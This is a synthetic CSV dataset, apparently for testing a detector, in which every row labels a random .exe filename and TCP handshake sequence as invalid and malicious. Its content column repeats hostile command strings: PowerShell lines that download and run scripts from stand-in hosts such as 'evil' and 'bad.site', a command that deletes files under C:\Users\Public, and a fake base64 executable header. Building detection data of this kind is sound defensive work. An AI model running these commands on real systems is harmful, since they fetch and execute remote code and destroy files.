trace_id,sequence,valid,description,category,content
aea95b2d46df2777.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
48eb94cc491f59b9.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
907a85cb99eb9025.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5b03fd654aaf2b82.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
da773aecb5b38de7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
9bb59da13df6375a.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
6db5f1d08ac37393.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
2c17d41ad13b83ae.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
d19eca13ca9c8ff9.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
54672ec8af0b3330.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
dcfbb405b77d475e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
6775fe3e5a9f98b1.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
78d61cd821fff22c.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
0c55f388e8331ffd.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
7b467bb043db5298.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a23ba221afda12cc.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
8ad422bd66b5a9c2.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
79ba5a7a70056da5.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
619a1fe68a1abdab.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
029477ff072e2c86.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
7f97e6d6337b217a.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
361fb5f143468200.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
e210bb0a557d8e99.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
92cf292cc1cb1ec8.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0626485a74e0892c.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
47e1e01c3af35547.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
61b277c90703979b.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
928793e8f0d35a4a.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
10697c9f4f38e8ad.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
6df174e9db461a26.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
0ed1706fd2b09a86.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
dc4152f3a3bc129d.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
5215ec882e86e860.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
050b38c2cf415a2d.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
516d2c1801739512.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
b6e63246afe40e8e.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
18bde825ebc56eec.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
a5339cde30bc4e02.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
73af704afab87c98.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
b617699d1445779a.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
507e235629310284.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
8d23ab287321aa51.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
58c7ad2c4f4fc4e7.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
ac3c24071de8a6c6.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
264c4f70c7d9169e.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
8803b64732179105.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
1f072b17e37be556.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
4f8bff007eeb2ac3.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
9ed557b77a87926b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
52a16eb4d0a5916c.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
879c834241fbfd30.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
d2d28ce9e628712a.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
4ffb60a6bdfa7e5f.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
6783ef413f3dc640.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
0ad234bb3f6d830c.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
54fe97f4af2c1a19.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
ce8b2363ab1ef149.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
a8d36f4d340e1009.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
8a9c292f3e66b9f7.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
7ace9d0f9f906f3b.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2698ac28bda60d16.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
1b71e8727590e035.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
e30f218748071777.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
2aafeab60021447f.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
24cc90be58f321af.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
62e44c4f4d2b4104.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
92a6864bd1ab7248.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
00db5e29f6a3f63b.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
08cd2d6d4abb73bf.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
aee8c2cd0f5858f9.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
7efe4ff4cba2c9ae.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
fdb61831707b301d.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
efb761d064a05326.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e8efa4ac0a78e78b.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
8bcdcd0930116eda.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,TVqQAAMAAAAEAAAA base64 payload header
705ad7747c2585d4.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
b6ef89ad934abd3b.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
fda02bec817e33a0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
92cfe8bf09fbb8e8.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
3a008e06592f52dd.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
83a652a9e80ff827.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
8fd0c8e90eddeed6.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9d44f5bc1e5b37b6.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
fa437d31c734102e.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
adbca35477fb3a09.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
e1d474385505f5c0.exe,SYN|ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
0d12b5e9f5f5999e.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,IEX (New-Object Net.WebClient).DownloadString('http://malware/payload.ps1')
7075bb331359a4c2.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
2cac6b6f1ed831e3.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
9b6aeea1915244ff.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
fed0463a22afe2d5.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
d3c37e88878ac980.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
3ded7bef8081e602.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
a82abec78a99db12.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
744d9b4d28b4ee66.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
c490b848591826dd.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b9d2bc9624f1e81b.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
c377dc79e60a07fe.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
96c3135cd8b53054.exe,RST,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
9c6ef89802a2c9e0.exe,ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
d9c865340abdb690.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
5764303dc206274c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,Invoke-WebRequest http://bad.site | IEX
1cc4e6ecab2c4d1d.exe,SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
0bd340493fe9842c.exe,SYN,false,Synthetic invalid handshake for malicious filename,Derived Malicious,cmd.exe /c del C:\Users\Public\*.txt
b81cfd4a25215c8e.exe,ACK|SYN|SYN-ACK,false,Synthetic invalid handshake for malicious filename,Derived Malicious,powershell -exec bypass; IEX (New-Object Net.WebClient).DownloadString('http://evil/p.ps1')
